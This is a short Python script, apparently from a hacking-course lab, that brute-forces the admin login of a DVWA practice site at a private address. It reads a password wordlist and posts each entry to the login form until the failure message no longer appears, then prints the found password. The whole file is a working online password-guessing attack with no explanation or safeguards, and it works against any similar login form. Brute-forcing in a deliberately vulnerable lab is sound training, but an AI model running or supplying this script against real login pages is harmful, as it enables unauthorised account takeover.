#!/usr/bin/env python

import requests

target_url = "http://10.0.2.5/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}

with open("/root/Downloads/passwords.txt", "r") as word_list:
    for line in word_list:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content.decode(errors="ignore"):
            print("[+] Got the password --> " + word)
            exit()

print("[-] Password not found")
